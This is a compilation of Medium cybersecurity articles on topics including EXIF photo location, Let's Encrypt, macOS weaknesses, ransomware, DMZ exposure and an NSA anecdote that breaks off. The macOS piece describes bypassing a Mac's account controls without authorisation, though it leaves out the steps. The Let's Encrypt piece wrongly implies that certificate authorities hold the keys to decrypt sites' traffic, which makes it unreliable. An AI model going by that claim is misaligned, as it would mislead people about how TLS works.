Given this basic psychology of spying it is impossible for GCHQ or the NSA to actually engage in serious cyber defence, because that would require reporting any vulnerability as soon as it was found and by doing that they would simultaneously seal off their own routes into other countries networks. The flows of intelligence they produce would dry up, they’d become politically vulnerable, budgets would be cut and they’d eventually be shut down. A laser-like focus on offence at any cost (in NSA parlance, “collect it all”) is the inevitable result.
Written by
","['Archive', 'Home page', 'Cybersecurity']"
Why I built the DickPicLocator™ - Per Axbom - Medium,https://medium.com/@axbom/why-i-built-the-dickpiclocator-e9d70a949201?source=tag_archive---------5-----------------------,"On August 8 I launched dickpiclocator.com, a service that invites you to upload an unsolicited dick pic and find out the exact location where the picture was taken. As I start writing this, 31 hours later, 932 images have been uploaded — an average of 30 pics per hour. Although there obviously are various prerequisites for this to even work, the broader response has been overwhelmingly positive. My underlying reason for this whole endeavour however has been to create an artefact that can illustrate the complexity of ethically sound web-based services and increase general awareness of what is contained in our digital footprints.
I have personally been made acutely aware of the dick pic phenomenon via the Instagram account assholesonline, run by Linnéa Claeson, which regularly showcases the very worst of male predatory behavior online. Her amazing work in dealing with threats and violations online has awarded her the human rights prize of the Swedish United Nations Association. The same account has empowered more women to speak up and the huge scale of this problem is nigh impossible to ignore when you try to understand the types of harassment many women endure in the digital age.
The DickPicLocator was an idea that unexpectedly popped into my head when I was trying to go back to sleep after waking up too early on Sunday morning. I would imagine it’s my brain’s mashup of assholesonline and an episode of the wonderful podcast Note to Self where Manoush Zomorodi explores all the data about a person that can be found in a simple selfie.
Here is a description from the show notes of the episode named Revealing Selfies. Not Like That.:
A little Google image search, a little metadata, and we can find where you are. Maybe who you are. What color phone you’re using to take the shot, and how many SIM cards you have.
Reading photos is more than a digital parlor trick. It’s the future of commerce, marketing, policing, lending, and basically everything else.
Most importantly, it struck me how amazingly simple it would be to put together. There was very little programming for me to do as most of what I did has already been done and shared on the Internet. I realized it may get a lot of traffic so building it fast-loading would be important. I used the Skeleton CSS framework and made sure not to have the start page be too heavy. In fact, building this website took me less than six hours.
It is rather important to realize that there is absolutely nothing technically unique about the tool I have built. It is all built on open source, freely available code and scripts, with a built-in PHP library (a set of ready-made scripts — as in having cake-mix and just adding water) to extract what is called Exif-data from photos.
In fact, finding the location of any photo can be done on your smartphone, without the use of my website. If you think about it, many phones today allow you to plot your photos on a map. You can of course do this with anyone’s photos as long as you have access to them.
The primary thing really that has given the website traction is the name, and in part the written content on the website. I like to think that my own credibility has contributed to some extent as well, although I purposely made it quite difficult at first for visitors to ascertain who was behind it all.
Hence it is my understanding of communication, copywriting and human curiosity that enabled me to spark interest for the tool. The tech is not new, or complicated. It’s like reading a Word document if you just know where to look.
As such, everything has gone according to plan.
I may have given the impression that the abundant sending of dick pics is something well-known. Let me rephrase: it is well-known within certain circles. I don’t think the extent of the problem is something that the general population tends to reflect on on a daily basis. It’s also a phenomenon that is over-represented in younger age groups (where more people have online communication as their primary mode of interaction); thus also age groups under-represented in politics and media. There is a tendency (an alarming one, as I see it) to regard these problems as inferior.
There’s also this mind-skewed vomit-inducing mantra of “boys will be boys” that has a perplexing foothold in the corridors of power.
I saw an opportunity to bring attention to the widespread existence of a world where dick pics are a thing of everyday life to the extent that they do not even come close to triggering surprise. Case in point: Hilary Stephenson questioned upon launch of my site whether anyone would even be interested in uploading pics, as she suspected they are so common now that they don’t even think of them. They’re just “life”.
Part of why dick pics upset me so much is that they are often sent from men hiding behind anonymous accounts. Whereas I see lots of reasons why it would be important to protect the possibility of being anonymous, this is not one of them. I saw the opportunity to empower recipients of dick pics and shift the power balance between the parties. Knowing location would be one factor in this power struggle. I have seen examples where, upon learning the identity of a harasser, women have sent along dick pics to parents to alert them of their child’s behavior. I was imagining this as a possible route and turn of events.
But of course, how each individual power struggle might play out after my service is used, with a confirmed location in hand and a sourced address at that location, I of course have no idea.
And here is where things begin to get complicated.
Early feedback on the website focused on trust and what would happen with the data. These are entirely valid and relevant questions. I decided for ethical reasons I would not save photos and I would not track users in any way. I have not added Google Analytics to the site. All these would require more legalese text and user consent forms. Photos are in fact deleted within a second of being uploaded. Thankfully I’m not paying to host thousands of dick pics.
At the same time I wanted to save some data. In my head it would be interesting to see what areas of the world I would get the most coordinates from. So I thought I’d save just coordinates and timestamps, never with the intent to publish coordinates but with the intent to later show what countries upload the most pictures.
Update: Since 20:35 CEST on August 16 I am also logging visits to the site using the open source platform Piwik. With the worldwide media coverage this site is getting I decided to to take this step as I was receving a lot of questions about number of visitors. Note that no data is shared with a third party (so nothing like Google Analytics); this tool is installed on my web host and respects if you have DoNotTrack enabled in your browser.
Someone quickly pointed out that a list of coordinates, if it got out, would implicate someone as having sent a dick pic from those coordinates even if someone was uploading an entirely different genre of photo for analysis. Not believing there is such a thing as being immune to hackers I reiterated and now only municipality names (along with country), timestamp and camera model are saved for each pic. And the counter is incremented by one for each successful upload.
At the same time, me promising that I won’t save photos doesn’t mean a thing if you do not trust me to follow through on that promise. Hence I am somewhat, but not completely, surprised at the number of uploads happening right now as I am writing. There is just something about free services that draw people like moths to flames. Part of the problem I want to address and create awareness around.
Early today (Wednesday) I actually added a warning below the upload form, beginning with the words “Hang on. Are you about to upload a picture to a service without fully considering how the photo will be used? Sure it says the photo will be deleted, but can you trust this? […]”
Still, the upload rate has not decreased.
Although an underlying intent here may be interpreted as empowering recipients of dick pics there is no way I can influence what a person actually does with the data. I mentioned forwarding a dick pic to the sender’s family. On the whole a devastating experience for the harasser perhaps but one can argue back and forth about the ethics of that. In a sense I would want the decision about repercussions to lie with the recipient of the dick pick. Given this, I would however not take complete responsibility of the human effects of my tool. Hmm, much like most social media websites.
The other problem here is that the same tool can be used to upload pictures that others have for example posted on dating sites, and retrieve locations of “innocents”, as one critic justly posted on Twitter. He went on to say (my translation): “Then unfortunately I can not share the site. The result will unfortunately be that women will be more unsafe on the Internet, not less.”
What I would argue however is that my tool, as I have mentioned, is in no way unique. The ability to retrieve the location data for any tagged picture is something that can be done with many other online tools, or even with built-in functionality on most smartphones.
While you may read my tool as being what the label says, a Dick Pick Locator, my true intent goes beyond this:
The increased awareness of the omnipresent dick pic phenomenon, and the empowerment of sufferers of the same, is a bonus and an aid in spreading the message of how pictures can make you vulnerable in unexpected ways.
The thing is, without my website the retrieval of locations from photos will still continue. And many people will continue to be in the dark about this until they suffer the consequences. What my marketing gimmick does is reach more people with the message: “Hey! Your photos contain a lot of information about your life, perhaps more than you could previously imagine. Maybe you should treat your photos with more care.”
My solid belief is that it is better for people to become aware than to stay unaware. It is better they learn about these weaknesses in the fabric of the internet than to keep behaving in a manner that unknowingly puts them at risk of being targeted by others for ill purposes. Perhaps some people will even start taking down photos they did not intend for people to read the location from.
If the latter happens, if people start thinking more about the information shared in their online photos and post in a more considered manner, my message has been received.
While hardware and software developers may see it as beneficial that photos are tagged with coordinates without the consent or even complete awareness of the user, I believe that this is one of the core ethical dilemmas that need to be adressed: what responsibility do the developers have for building awareness rather than staying silent about the potential risks of the decisions they make?
I bring up the topic of commercialization because a woman expressed appreciation of the tool but also frustration over the fact that this type of problem can be “commercialized”. The idea of monetizing a tool like this had not really occurred to me but it does bring to light a problem I see in many startups, design agencies and various marketing professions. As this is close to the subject of my book in progress on the ethics of digitalization I’ll address it here as well.
Sometimes I can see professionals defining a persona such as a super-stressed working single mother as a target group for service X. Service X may be something that is ethically sound, perhaps helping people recycle. The premise then being: how can we help these people, who have very little time because their lives are really difficult, recycle more.
The issue with this is that the target group itself is a problem waiting to be solved, not a perpetual state to build for. And so if we define target groups with inherent problem sets and build solutions for these target groups, our business will suffer if the target groups we are building for do not persist. Hence it is within the organizations’ interest that these target groups stay the same. Organizations will organically work to maintain the suffering that the target groups are experiencing because otherwise their service will become obsolete.
An easy way to think of this is to consider how the the fossil fuel car industry has resisted renewable energy sources for so long due to their fear of becoming obsolete.
In the same way if someone were to monetize a service such as the DickPicLocator, it would make good business sense to promote the sending of dick pics.
Not gonna go there.
Okay, but how useful is this tool really? I’m gonna go out on a limb now and propose that it is less useful than many will hope. The thing is, and I have tested this, that some messaging services actually strip data from pictures when they are sent over their networks. In such cases the coordinates are no longer available to the recipient. A decision made entirely by these messaging services and also not communicated to the users.
My best-case scenario is that potential dick pick perpetrators are the ones who try the tool, and upon seeing their own house on a map are deterred from following through.
Whether or not the messaging services actually do save the coordinates somewhere I can not answer, but I would suspect that they do. That data is valuable. It can be monetized. And remember how the podcast Note to Self so eloquently put it:
Reading photos is more than a digital parlor trick. It’s the future of commerce, marketing, policing, lending, and basically everything else.
I honestly doubt that many profit-driven businesses would even consider NOT saving GPS data about the users of their services. It’s just worth too much. Anonymized, you say? True anonymization is in fact much more difficult than most companies would care to admit.
Which brings us to a new level of moral dilemma. The service may know where the perpetrator who harasses you lives, but you have little or no control over the data that could help you gain justice. We give up our data and we also give up our control over the data. This is the cost of free.
In my case, people may have questioned the validity of my claims that I do not save data. They may suspect that I actually want to monetize on the data. Or people may not trust that I have the know-how to keep the data safe.
These suspicions are sound and relevant.
What worries me is that these suspicions do not seem to apply when regularly sharing data with private companies that happen to have a free app that you like to use. For a while everything may seem okay but all of a sudden a company hits financial challenges. Why wouldn’t they sell data about you to survive?
“But Dad, all my friends are using it, so why shouldn’t I?”
The answer is probably in the small print, but reading terms of service and privacy policies has become a joking matter these days. We all know that nobody reads them. Yet nobody seems equipped to address this issue. A little more than five years ago two Carnegie Mellon researchers suggested that reading all of the privacy policies an average Internet user encounters in a year would take 76 work days. Even if you wanted to read them you couldn’t.
All that is left is trust. The problem, I suppose, is that you have to invest in that trust by giving away all your personal data before you can even start to form your own educated opinion.
As consumers we always need to question and place demands on providers of the services we use when they act in conflict with out best interests. But if most consumers are in the dark about what’s going on then how could they possibly begin to express demands?
Had I saved the data that passes through my service it would have been possible for me to create the dick pick version of I Know Where Your Cat Lives. This website has automatically downloaded thousands upon thousands of photos of cats from the Internet, read all the GPS data from these photos, and placed the cats on a map indicating the exact house where these felines spend their days. Ew, imagine the awful sight if DickPicLocator were to do this.
Examples such as this cat site can only begin to give you an understanding of how data about you, your locations and your belongings can be used to track and draw conclusions about your behavior in the present and in the future. The obvious conclusion is that whis would be used to sell you stuff, but perhaps, for now, it’s just used to watch you… like a fish in a tank.
In Sweden over the past weeks there has been a national trust crisis around the events of Sweden’s transport board outsourcing their data management and in the process placing military data at risk of being exposed to third parties without security clearance.
Although the media are notoriously weak in explaining the real challenges in protecting data and focusing more on the blame game, it is an example of how the world of data is moving at a pace where it is hard to keep up with the way in which data can be leaked. And perhaps some of it does not even have to “leak” anymore because valuable data is becoming so freely available.
As many citizens are keen to point fingers at the elected leaders and managers I can not help but think about how a majority of citizens are themselves assisting in the mapping of the whole country, both outside and inside buildings, by simply taking millions of pictures and posting them online — with the exact GPS coordinates freely available. This data can be sourced just like the cat pictures and used to map out buildings and vehicles in colorful detail.
It wouldn’t surprise me if the website I Know Where You Swedes Live already exists, albeit behind a password-protected login.
Well, Swedish national radio called me earlier today, I’m hoping for some interviews tomorrow, and the website certainly seems to be making some waves. I’m just hoping these waves will bring more awareness. I also hope that my good intentions in this are not misguided and that the good effects will outweigh the bad ones. I won’t pretend that there may not be some.
I’m trying to avoid being a bystander when we can start working to address the issues rather than pretending they do not exist or are not as serious because we ourselves lack experience in being on the receiving end. I would encourage you to talk to your peers about both the dick pic phenomenon and the personal data contained in images. Are you doing or sharing things in a way that can hurt yourself or others?
I believe that sparking these discussions will be my proudest and most tangible outcome when in the future I sit down to evaluate this crazy idea I had in my bed on Sunday morning just three days ago, and that now has taken on a life of its own.
Upon putting the finishing touches on this post the number of uploads to the website have surpassed 1,000. The counter says 1,057. As you will know, at least if you place your trust in me, I have no way of seeing what percentage of those are actually dick pics or people just experimenting with the service. I’m just hoping that “dp percentage” is low. Be careful out there.
Written by
","['Privacy', 'Cybersecurity', 'Internet Security', 'Ethics', 'Big Data']"
"Why Let’s Encrypt is a really, really, really bad idea…",https://medium.com/swlh/why-lets-encrypt-is-a-really-really-really-bad-idea-d69308887801?source=tag_archive---------0-----------------------,"Your web site’s ability to rank in Google search results is now a function of whether you use Secure Sockets Layer (SSL). Or to put it another way, whether you have it addressed at an URL starting with “https”.
In an effort to promote the use of SSL across the web, industry participants have formed Let’s Encrypt, a service provided by the Internet Security Research Group. The service has taken off, with major hosting providers creating tools to automatically create SSL certificates and install them on hosted sites. Sounds like an advance in cyber security, right?
Uh…, maybe not?
The heart of encryption is the encrypting key. Imagine for a moment you have a real-world lock big and strong enough to withstand a 50 caliber rifle shot. What good is that if the bad guy ends up with the key? The digital analogy is the cipher strength of the certificate used to encrypt your website’s traffic. To apply the 50 caliber rifle shot analogy, if the bad guy gets a hold of the “private key” used to generate the SSL certificate, the size of the cipher is rendered entirely irrelevant.
There are numerous Certificate Authorities (CAs) which sell SSL certificates. Each has its own externally audited “Key Management System” (KMS). These CAs submit their audits to the major Operating System vendors like Microsoft, Apple, and Google in order to get their “root certificates” in the OS’s “trusted certificates” store. This is what makes their website SSL certificates work when someone with, say, a Mac navigates to your site.
From a security standpoint, the market fragmentation of CAs is a feature, not a bug.
Medium.com’s SSL certificate was issued by DigiCert (and will expire in August — heads up Medium!). If DigiCert’s Key Management System is compromised, all of their SSL certificates will have to be revoked and re-issued. But if one of the other CAs is compromised, it would not affect Medium’s site.
Let’s Encrypt is an example where the “convenience” of automated issuance of “free” SSL certificates is a bug, not a feature.
The more sites secured by Let’s Encrypt certificates, the bigger the threat surface becomes because the compromise of Let’s Encrypt’s KMS could potentially affect a large number of sites. Let’s Encrypt is being chosen right now because it is a “fire and forget” solution for encrypting site traffic. If a site certificate is revoked, and no one is paying attention to this possibility, traffic will drop precipitously and you as a business person may well be no the wiser for why your lead generation dried up. (Certificate expiration, with no one paying attention, is why no one at Equifax knew they had been hacked for months.)
“Fire and forget” might not be a particularly good idea in cyber security. Just sayin’…
To understand why this matters, imagine you could position yourself in the middle between a company’s website and their customers or visitors. You can suck up all of that traffic — and if you have the private keys from a CA like Let’s Encrypt you can decrypt the traffic from sites using their certificates. But that’s not the worst of it: Your place as a “man in the middle” cannot be detected by traditional scanning. You’re not necessarily in the network hosting the site and you’re not in the customer/visitor’s computer. But you are in the middle — undetectable and with the keys to the kingdom.
How would you get there? The easiest and most likely way has little at all to do with technology. You just manage to plant an insider into the CA’s division that administers its Key Management System.
The insider threat applies to all Certificate Authorities — but not equally, from a cyber security point of view. Let’s ask this general question:
Who loses what if a CA’s KMS is compromised?
Prior to Let’s Encrypt the answer would be the CA’s ownership loses reputation and business. If the CA was run by a publicly held company, investors lose value in their portfolio and the company would likely be exposed to shareholder lawsuits. Management would likely be fired.
Let’s ask the same question of Let’s Encrypt: Who loses what?
There are no “owners;” this is a not-for-profit organization. There is no revenue; the SSL certs are free.
Nobody loses anything; there is no “skin in the game.”
As more business is done on the web, business people would like there to be a “fire and forget” solution for protecting the confidentiality of their customers’ data. The hard truth is no such solution exists. So what are startups and other small businesses to do?
First: Avoid the temptation of “free” and “convenient.” Major SSL Certificate Authorities have tools you can use, or have your computer support person use, to issue your site’s SSL certificate. They also offer installation support, as do major hosting companies. There’s a process to verify you own the domain, but it not unreasonably cumbersome. Pay attention especially to the breach insurance they offer as part of their product.
Second: If your site is hosted by a hosting company, pay careful attention to the hosting agreement when it comes to who is responsible for what in terms of securing your site. You will likely need to use their tools to create the “certificate signing request” (CSR). Your CA will require the CSR to generate the certificate.
Third: If you contract out the site development and maintenance, ask the provider if they carry cyber insurance. (This is probably the biggest reason to avoid off-shoring this kind of work.) Require them to provide you proof of coverage in case their “errors and omissions” causes your site to be breached.
Written by
","['Top Story', '▫️Medium Things▫️', 'Cybersecurity', 'Ssl', 'Ssl Certificate', 'Web Development', 'Branding']"
Why macOS is unbelievably insecure - AwesomeIndustry - Medium,https://medium.com/@AwesomeIndustry/why-macos-is-unbelievably-insecure-9c4e23a334a1?source=tag_archive---------8-----------------------,"The popular belief is that macOS is more secure than Windows. While Macs have less viruses written for them, they still are incredibly insecure. Here are several vulnerabilities you might not have heard of before:
Webcam spying has become increasingly scary. You might say that Macs are completely safe because the webcam has a nice little indicator light that turns on when you are recording. However, this isn’t the case. In some older Macs, there is software built to disable the camera light completely. Even though this happened about 10 years ago, the scary thing is that there’s a setting that’s built-in that changes the brightness of your screen by using the light sensor.
If you’re reading this on a Mac and have this setting enabled, you can place your hand over the light sensor right now and watch the screen go darker. The LED never turns on during this. This means that macOS is at least capturing some data from your surroundings and it is doing so without the little light going on.
On a Mac, there’s a pretty-easy way to add a new admin account without permission from the owner of the Mac. Here’s how (and don’t worry — I’ll show you how to prevent this, too):
This method essentially tricks the computer into thinking that it’s being set up for the first time. All your files are still intact, except you now have a new user account under your control. I don’t think I have to say that being able to rip a mac out of just about anyone’s hands and add an admin account is scary.
If you own a Mac, I bet you’re pretty terrified right now. If you’re running a Mac that is part of the 98% or so that don’t have a firmware password, you are at risk. If someone steals your laptop, they have access to all of the information on your computer. But, Apple wasn’t just about to leave a gaping hole in their system. If you’re interested in blocking these kinds of attacks, try setting a firmware password. Note: If you lose this password, you’ll have to take your computer to Apple to get it fixed, but that’s a small price to pay for peace of mind.
Also, given about 5 minutes, it is possible (and quite easy) to reset anyone’s password on most Macs. If you don’t have a firmware password set up (which is very hard to turn on), you’re at risk for this type of attack, too. Here are the steps to resetting anyone’s password on a modern-ish mac:
Keep in mind that you don’t need authorization to do this. The only caveat with this method is that if you have an Apple ID linked to your account, you’ll need to use that to reset your password. However, there are many other ways of resetting passwords (and some of them are pretty easy) than I have described here.
In Mac OS 10.7.5, the folks at Cupertino introduced Gatekeeper. While originally designed to protect against malware, it grew into a headache for developers and consumers alike. Apple is creating massive security holes while making developers jump through more hoops just to give their customers peace-of-mind. Here’s what developers have to do to get their app Gatekeeper-approved:
For apps that are downloaded from places other than the Mac App Store, developers can get a unique Developer ID from Apple and use it to digitally sign their apps. The Developer ID allows Gatekeeper to block apps created by malware developers and verify that apps haven’t been tampered with since they were signed. If an app was developed by an unknown developer — one with no Developer ID — or tampered with, Gatekeeper can block the app from being installed.
If you want to get started with Gatekeeper, you have to pay a hefty $99 fee per year. No wonder some companies just include disabling gatekeeper as part of the installation process. Companies like Lulzbot simply can’t or don’t want to deal with the legal application process. Here’s another quote from their web page:
Enrolling as an Organization
If you’re enrolling your organization, you’ll need an Apple ID as well as the following to get started:
A D-U-N-S® Number
Your organization must have a D-U-N-S Number so that we can verify your organization’s identity and legal entity status. These unique nine-digit numbers are assigned by Dun & Bradstreet and are widely used as standard business identifiers. You can check to see if your organization already has a D-U-N-S Number and request one if necessary. They are free in most jurisdictions. Learn more
Legal Entity Status
Your organization must be a legal entity so that it can enter into contracts with Apple. We do not accept DBAs, fictitious businesses, trade names, or branches.
Legal Binding Authority
As the person enrolling your organization in the Apple Developer Program, you must have the legal authority to bind your organization to legal agreements. You must be the organization’s owner/founder, executive team member, senior project lead, or have legal authority granted to you by a senior employee.
I think that’s why a lot of companies don’t want to have to find a lawyer just to publish an App. I certainly wouldn’t. And then there is malware that easily bypasses gatekeeper. Apple is making everything harder for developers, while letting basic malware like this one slip under the radar. What’s worse is that Apple introduced the ‘Auto Rearm’ feature to Gatekeeper in Yosemite, meaning that it turns on after 30 days of inactivity. Luckily, it’s possible to disable this ‘feature’ by using the Terminal. However, the Terminal can be very scary to some Mac users.
I have two tips for you. The first is to set a firmware password on your Mac. This protects against all of the password-reset methods that I know of. The second is to enable FileVault. This encrypts your hard drive and makes it so no one can look through your storage volumes.
Written by
","['Security', 'Macos', 'Password', 'Camera', 'Cybersecurity']"
Why North Korea Has the Best Cybersecurity in the World,https://medium.com/war-is-boring/why-north-korea-has-the-best-cybersecurity-in-the-world-ac1502f74ac1?source=tag_archive---------6-----------------------,"by MATTHEW GAULT
Guccifer 2.0, a hacker allegedly linked to the Russian government, released a treasure trove of emails stolen from the Democratic National Committee on the eve of the party’s convention.
Set the politics aside for a moment and see the hack for what it is — an act of foreign aggression playing out on a strange new battlefield. It’s another Watergate … had Watergate succeeded and been perpetrated by the Kremlin.
This week on War College, we talk to the man who literally wrote the book on cybersecurity — Peter W. Singer, senior fellow at the New America Foundation and the author of Cybersecurity and Cyberwar: What Everyone Needs to Know.
Singer walks us through Moscow’s information warfare strategy, tells us why North Korea has the best cybersecurity on the planet and explains why everything we know about cybersecurity is wrong.
Written by
","['Air', 'Land', 'Sea', 'History', 'Culture', 'Politics', 'Store', 'Wib Politics', 'Podcast', 'Cybersecurity']"
Why Ransomware? Why Now? - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/why-ransomware-why-now-bd1395a147cb?source=tag_archive---------4-----------------------,"Jeremiah Grossman has asked an interesting question and proposed one hypothesis for a solution. Personally, I think the hypothesis is incomplete.
We had a brief discussion, but obviously there is no way to answer this question by speculating on Twitter.
The question we want answered is laid out fairly well: Why is ransomware exploding now, and not years ago? Following the basic Intelligence Cycle we have our Tasking, and now we need to plan our Collection. What data will help us answer this question? How do we get that data?
Intelligence is data plus analysis.
It will be critical to have a timeline of events around ransomware malware, showing the start, the spread, including key innovations and the dissemination of the practice across criminal groups.
Timeline the Spread of Ransomeware Innovation:
UPDATE:
An excellent point was raised about technical solutions for money transfer pre Bitcoin. The process for acquiring and transferring eGold or Liberty Reserve was about as complex as the process for Bitcoin (assuming a non technical “average” user.) So why wasn’t ransomware a serious problem a decade ago when computers were more vulnerable and there was an existing technical solution to transferring electronic money.
One hypothesis for the lack of earlier ransomware growth would be that at the time existing monetization strategies were sufficiently lucrative that there was no need to invest in innovation. As a business, committing to a new and unproven strategy is highly risky and not something likely to happen there’s an existing successful plan in place.
Attackers have finite resources. If they are delivering a ransomware malware payload they are displacing an alternative payload, such as a spam relay bot, bank fraud or credit card theft malware, etc. etc. Attackers will, in theory, invest their resources into the most profitable attacks they have the capability to execute.
Malware is a Business
The rise of ransomware will therefore be reflected by other changes in the malware based criminal ecosystem. There will be a rise on ransomware support services (such as call centers), but has there also been a change in other more traditional malware attack payloads? Are there fewer banking trojans, or not? That is, has ransomware displaced other malware variants (and if so, which ones?), or has it simply augmented and added to the number of active threat actors?
Has Ransomware Affected Other Attacks
The innovation of ransomware is to provide a better monetization mechanism for a compromised system. The majority of boxes that are pwned in malware campaigns are of very low value. Your family photos have great value for you, but they are completely worthless to a random criminal. Ransomware’s great innovation was to realize that those “worthless files” are actually extremely important to at least one person, the owner, and to monetize that value directly.
The knowledge of this value has existed for decades (see Jeremiah Grossman’s tweet), but clearly several key supporting factors were not in place until recently. One of those support factors was very obviously Bitcoin, but Bitcoin is itself several years old. What made criminal groups invest resources in developing Bitcoin based ransomware when they did, and not before? My hypothesis is that a reduction in revenue from other vectors forced a search for new streams. Cashing out credit cards is annoying, difficult, hard, and I suspect it is less profitable than it used to be.
Criminal Group Sensemaking
Collecting the information about the criminal groups generating the ideas for BTC ransomware, disseminating the innovation across the criminal underworld, and innovating new ways of increasing monetization would require a developing sources within the malware criminal community. There are people who have such sources and could probably provide a reasonably complete timeline of events regarding ransomware’s spread from the point of view of the malware criminal community.
With the data outlined above it will be possible to begin to understand why ransomware has become more prevalent now than it was years ago (e.g. why didn’t BTC ransomware rise at the same time as Silk Road? Both were criminal enterprise that relied on Bitcoin.)
In addition to the data sources, there needs to be a rigorous analysis of alternative competing hypotheses (ACH) along with other proven analysis techniques. (Aside: most useful analysis technique? years of experience in the domain being analyzed.)
This is how Intelligence could provide awareness about the changing threat landscape that is the Internet we all use. The deliberate attempt to illuminate an issue by targeted data collection and rigorous analysis is what real intelligence can provide.
Anti virus firms will have the data to answer the majority of these questions. I hope they have the trained analysts to process and synthesize the data into actual intelligence. And I really hope that someone does this and disseminates the resulting intelligence product to the community. Any takers?
Written by
","['Security', 'Cybersecurity', 'Intelligence']"
Why the heck are you still using a DMZ segment??? - Almog Ohayon - Medium,https://medium.com/@almog009/why-the-heck-are-you-still-using-a-dmz-segment-9c363a309c53?source=tag_archive---------8-----------------------,"DMZ is an old concept where you have less secure/untrusted network segment which is reachable through the internet to provide some services to your corporate users like mail gateway, vpn, webApp, etc… but the problem is that in most cases it has backend connection to the internal network, through firewall, like it supposed to help… :-(
Hackers has basically 3 common ways to breach your network:
1. Social engineer and send phishing email, client side attack. 2. Compromise public websites and upload malware to be used for drive-by-download, client side attack. 3. Hack your DMZ or any Application facing the internet and from there finding a way to pivot to your internal network.
*There are more ways of course but this is as of today definitely the majority.
Let’s base my “theory” with some real life examples:
In nutshell Hacking Team was a company that helped governments hack and spy on journalists, activists, political opposition, and other threats to their power.
The hacker (according to his version) didn’t choose phishing email technique because hacking team was using phishing as their day-to-day operation to hack other people so he wanted a more stealthy method and not raising any flag for the first intrusion.
He found out that on their public network segment there’s a web server running Joomla, a mail server, a couple routers, two VPN appliances, and a spam filtering appliance.
Personally I would choose Joomla, tons of exploits and ways to get in but he chooses eventually to write 0day for one of the embedded devices there.
From that point where the hacker has physical access from the DMZ to the internal network it’s not the easiest job but for a professional hacker it’s just a matter of time to find the right vulnerability, mis-configuration or any credential to lead to the crown jewels on the internal network, Game-Over.
Sources:
http://pastebin.com/raw/0SNSvyjJ
Outlook-Web-Access is another old concept where you are exposing your mail server as an http/https server to provide remote email access to your corporate users, it’s a real “candy” for hackers since exchange server is usually connected to the Domain Controller which means from an attacker point of view I can intercept pretty easily Domain Admin and other high privileged accounts.
A real live attack example was captured by Cybereason, they found a dll injection backdoor in their customer OWA server which managed to capture 11,000 corporate identities and from there the attacker can access any resource which belong to any user in the domain.
Another allegedly incident was Panama Papers where their OWA was last update on 2009 which makes it easy intrusion and later access to any email on that exchange server.
**on the panama papers incident it’s unclear what was the first intrusion, it has some other shameful entry points like joomla and wordpress connected to the internal network.
Sources:http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-Webmail-Sever-APT.pdfhttp://www.wired.co.uk/article/panama-papers-mossack-fonseca-website-security-problems
Most of the popular VPN’s today are using “agent-less” SSL VPN option which means you have https server facing the entire world exposed to web and injection attacks.
This is one of the most popular and powerful attack vector since you can have an immediate access to Admin credentials and then you basically have an easy pivoting and clear path to anywhere in the network.
One of the easiest hack is just paying to a corporate user for a legitimate identity so I can access remotely through the VPN to the internal network and install whatever I want without being physically in the company’s offices.
A more complex attack scenario is hacking the VPN http server and place a backdoor to intercept credentials, because it is very common to connect your Domain Controller to your VPN in order to provide a single-sign-on to your users, placing a backdoor inside the VPN makes it very powerful to attackers.
Sources:http://www.securityweek.com/attackers-target-organizations-cisco-webvpn
http://www.theverge.com/2015/12/22/10638482/juniper-networks-vpn-vulnerability-backdoor
Today almost any possible service has SAAS implementation which means you don’t need to risk your internal network anymore, you can move almost any App or service to the cloud very easily, so please please stop exposing your network to the internet like it’s 2005!!!
Isolate your production Data-Center network from the Enterprise network and use different management identities, it makes hacker’s life much harder.
I agree that in some rare cases you need to have remote services to your corporate users but there’s no justification to provide hackers easy access like username and password only to compromise your entire network only because it’s easier from operation admin point of view.
You have to treat your remote co-workers as an hostile environment which need to limit the access for any service they use remotely(also internally but it requires a different post).
Think worst case scenario for every service you have and every part in your network as hacker owned.
Written by
","['Cybersecurity', 'Tech', 'Internet', 'Hacking']"
Why the NSA Called Me After Midnight and Requested My Source Code,https://medium.com/datadriveninvestor/why-the-nsa-called-me-after-midnight-and-requested-my-source-code-f7076c59ab3d?source=tag_archive---------0-----------------------,"Please listen carefully and don’t hang up. Those were the first words this unknown male caller said to me when my brother handed me the phone.
It was the July 4th weekend, 2000, give or take a day, and Mr. X knew to say that first because he was calling me after midnight at my brother’s house in Connecticut. This was beyond creepy because I lived in California and nobody knew I was in Connecticut except for my immediate family, who were all there with me in the house. I had only arrived the day before as I do most years about this time for our annual family picnic.
Why was this guy calling me?
It was a matter of national security.
The caller apologized for waking us up and said his name was Dave. He asked me to get a pen and paper because he was about to give me some important instructions that would allow me to confirm his identity. Then he dropped the bomb and said “it was a matter of national security.”
By now some of the other people in the house had started to gather around where I was standing in the kitchen by the wall-mounted phone. What the hell was going on? I signaled to my brother to bring me a pen — stat.
I was still trying to process what was going on, and strangely, I didn’t even have the frame of mind to ask Dave how he got this number. He sounded serious and spoke with an air of authority; I guess I was already convinced he was on the level.
Okay, I’m ready to write.
Dave told me he was with the NSA in Bethesda — the National Security Agency. He couldn’t say anything more until I called him back. This is why I needed the pen. He was about to give me a series of steps to follow to call him back in a way that proved his identity and cemented the gravity of the situation.
Dave instructed me to hang up the phone and dial 411 (information) and ask the operator for the main number to the naval base in Bethesda, MD. I was to call that number and then work my way through a series of other base operators, asking each in turn to connect me to the next one in the chain. He gave me the exact words to say at each hop since I’d be asking to be put through to a secure facility.
The adrenaline had kicked in and I was wide awake.
To put me at ease, he said he’d call back in ten minutes if he didn’t hear from me — just in case I messed up. But I didn’t mess up.
A few minutes later I was back on the phone with Dave. Whoa — the NSA. This was actually real. The adrenaline had kicked in and I was wide awake.
Dave proceeded to tell me that they were in possession of a laptop containing files that had been encrypted using my SafeHouse privacy software. They had a national security situation that required immediate access to those files and they needed my help; or more specifically, for me to help them gain access possibly faster than they could do all on their own. Time was of the essence; hence, the midnight call.
Bad things were about to happen if the NSA couldn’t get into those files.
SafeHouse was (and still is) a popular Windows utility I developed to encrypt private files which was distributed as Internet shareware. The free shareware edition purposely featured weak encryption to comply with State Department export controls on munitions as well as to encourage users needing serious privacy to upgrade to the stronger paid edition. My customers ranged from home users to big Wall Street institutions.
Bad things were about to happen if the NSA couldn’t get into those files. Maybe people would die, or at least Dave instilled that impression on me as he politely asked if I would be willing to give him my source code; all the while, apologizing for not being able to tell me anything more about the situation.
